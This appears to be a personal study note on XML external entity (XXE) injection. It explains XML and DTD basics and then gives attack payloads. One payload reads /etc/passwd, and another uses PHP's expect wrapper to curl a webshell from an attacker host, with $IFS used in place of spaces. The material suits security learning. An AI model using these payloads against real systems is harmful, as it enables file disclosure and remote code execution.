```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
XXE injection is when a user can submit malicious XML to a web-server backend. Due to the power of XML, this can have devastating consequences from disclosing sensitive files to denial of service; it is considered one of the [Top 10 Web Security Risks](https://owasp.org/www-project-top-ten/).

## XML
*Extensible Markup Language* (*XML*) is a common markup language that is primarily for storing data and representing structures. It is not particularly designed for displaying the data itself. XML is made up of several types of components:
- *Tag* : The keys of the XML document, usually wrapped with `</>` : `<date>`
- *Entity* : An XML variable, usually wrapped with `&`/`;` : `&lt;`
- *Element* : The root element of any of its children, its value is stored in between a pair of tags : `<date>31-10-2025</date>`
- *Attribute* : Optional specifications for any element that are stored in the tags : `<img size=1>`
- *Declaration* : Usually the first line of an XML document, and defines the XML version and encoding to use : `<?xml version="1.0" encoding="UTF-8"?>`
- *Comment* : Readability comments : `<!--` / `-->`

As several characters are using in the syntax, we need to use entities to represent them elsewhere:
- `<` : `&lt;`
- `>` : `&gt;`
- `&` : `&amp;`
- `"` : `&quot;`

An *XML Document Type Definition* (*DTD*) allows for validation of an XML document against a pre-defined document structure:
```xml
<!DOCTYPE email [
	<!ELEMENT email (date, time, sender, recipients, body)>
	<..SNIP..>
	<!ELEMENT to (#PCDATA)>
	<!ELEMENT body (#PCDATA)>
]>
```
DTDs can be placed in the file (*usually just under the XML declaration*) but can also be referenced from another URL or external file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://example.com/email.dtd">
```

We can also define custom entities in DTDs, this allows us to reference variables and reduce repetitive data. This uses the `ENTITY` keyword, followed by name and then value
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
	<!ENTITY company "Random Company">
]>
<data>&company;</data>
```
We can include files using this:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
	<!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

## LFI Through XXE
First, we need to know if there is anything that gets reflected back to the user. If so, we can use that to inject our malicious XML into and have it reflected back. For example:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<email>
		user@example.com
	</email>
</root>
```
If the email is reflected we could modify the request to:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<root>
	<email>
		&xxe;
	</email>
</root>
```
> We can try with just some text to see if its even possible before trying to read a whole file `<!ENTITY xxe "some text">`
> We can also use things like PHP wrappers to encode files if we need as anything containing XML syntax will break this

## RCE Through XXE
Most commonly we are looking for SSH keys or trying to make the XML call out so we can grab things like NTLM hashes. But we might be able to use methods like PHP's `expect` wrapper to gain RCE. If we host a webshell on our machine, we can call it through XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ <!ENTITY xxe SYSTEM "expect://curl$IFS-O$IFS'ATK_IP/shell.php'"> ]> 
<root>
	<email>
		&xxe;
	</email>
</root>
```
> We need to try to avoid using things that could break the syntax of XML or the code (eg. `$IFS` instead of spaces)
> SSRF may also be possible through XXE